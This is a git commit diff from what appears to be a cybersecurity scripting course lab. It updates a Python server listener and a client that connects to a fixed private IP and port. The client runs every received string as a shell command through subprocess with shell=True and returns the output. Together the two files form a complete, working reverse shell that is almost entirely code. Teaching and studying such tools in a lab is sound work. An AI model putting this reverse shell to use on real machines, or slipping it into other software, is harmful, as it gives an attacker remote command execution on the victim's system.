8957901391a7fd92dd8c9cddb5fbb4d4df0e6d32
Lenaleu <lenaleu@dunwoody.edu>
2025-03-13 20:10:24 -0500

    Final Lab 2 changes

--- Scripting-for-Cyber-Professionals-Lab2.py
+++ Scripting-for-Cyber-Professionals-Lab2.py
@@ -8,28 +8,44 @@ def connect():
     mySocket.bind(("192.168.83.128", 8080)) 
     mySocket.listen(1)
     connection, address = mySocket.accept()
-
     print("=" * 50)
     print(f"Connection established: {address}")
-
+    
     while True:
-        command = input("Shell > ")
-
-        if "terminate" in command:
-            connection.send("terminate".encode())
-            connection.close()
+        try:
+            command = input("Shell > ")
+            if "terminate" in command:
+                connection.send("terminate".encode())
+                connection.close()
+                break
+            else:
+                connection.send(command.encode())
+                response = connection.recv(5000).decode()
+                if not response:  # Empty response could indicate closed connection
+                    print("Connection may have been closed by the client")
+                    break
+                print(response)
+        except BrokenPipeError:
+            print("Connection lost - the client has disconnected")
             break
-        elif command.startswith("cd "):
-            connection.send(command.encode())
-            response = connection.recv(1024).decode()
-            print(response)
-        else:
-            connection.send(command.encode())
-            response = connection.recv(1024).decode()
-            print(response if response else "[!] No output returned.")
+        except ConnectionResetError:
+            print("Connection was reset by the client")
+            break
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            break
+    
+    # Always ensure the socket is closed properly
+    try:
+        connection.close()
+    except:
+        pass
 
 def main():
-    connect()
+    try:
+        connect()
+    except Exception as e:
+        print(f"Failed to establish connection: {e}")
 
 if __name__ == "__main__":
     main()
--- client (1).py
+++ client (1).py
@@ -1,43 +1,60 @@
 import socket
 import os
-import subprocess  #  Import necessary libraries
-
+import subprocess
 
 def connect():
     mySocket = socket.socket()  # Initialize socket object
-    mySocket.connect(("192.169.94.129", 8080))  # Bind socket to Kali IP and port
+    try:
+        mySocket.connect(("192.168.83.128", 8080))  # Connect to server IP and port
+        print("Connection established with server")
+        shell(mySocket)  # Call the shell function after connecting
+    except ConnectionRefusedError:
+        print("Cannot connect to server. Make sure the server is running and the IP/port are correct.")
+    except Exception as e:
+        print(f"Connection error: {e}")
 
-    while True:  # Recieve commands from server continuously
-        command = mySocket.recv(1024).decode()  # Decode rec'd command
-
-        if "terminate" in command:  # Terminate session if requested
-            mySocket.close()
+def shell(mySocket):
+    while True:
+        try:
+            command = mySocket.recv(5000)
+            if not command:  # If empty data is received, connection might be closed
+                print("Connection lost")
+                break
+                
+            if "terminate" in command.decode():
+                try:
+                    mySocket.close()
+                    break
+                except Exception as e:
+                    informToServer = "!ERR!: " + str(e)
+                    mySocket.send(informToServer.encode())
+                    break
+            elif 'cd' in command.decode():
+                try:
+                    code, directory = command.decode().split(" ", 1)
+                    os.chdir(directory)
+                    informToServer = "Current Working Directory is: " + os.getcwd()
+                    mySocket.send(informToServer.encode())
+                except Exception as e:
+                    informToServer = "!ERR!: " + str(e)
+                    mySocket.send(informToServer.encode())
+            else:
+                cmd = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, 
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                mySocket.send(cmd.stdout.read())
+                mySocket.send(cmd.stderr.read())
+        except Exception as e:
+            print(f"Error in shell: {e}")
             break
-        elif "cd " in command:
-            try:
-                code, directory = command.decode().split(" ", 1)
-                os.chdir(directory)
-                informToServer = "Current Working Directory is: " + os.getcwd()
-                mySocket.send(informToServer.encode())
-            except Exception as e:
-                informToServer = "ERRRR: " + str(e)
-                mySocket.send(informToServer.encode())
-        else:  # Run rec'd command if not 'terminate'
-            cmd = subprocess.Popen(
-                command,
-                shell=True,
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-            )
-
-            mySocket.send(cmd.stdout.read())  # Print output on server
-            mySocket.send(cmd.stderr.read())  # Print error on server
-
+    
+    # Always close the socket when done
+    try:
+        mySocket.close()
+    except:
+        pass
 
 def main():
     connect()
-
 
 if __name__ == "__main__":
     main()
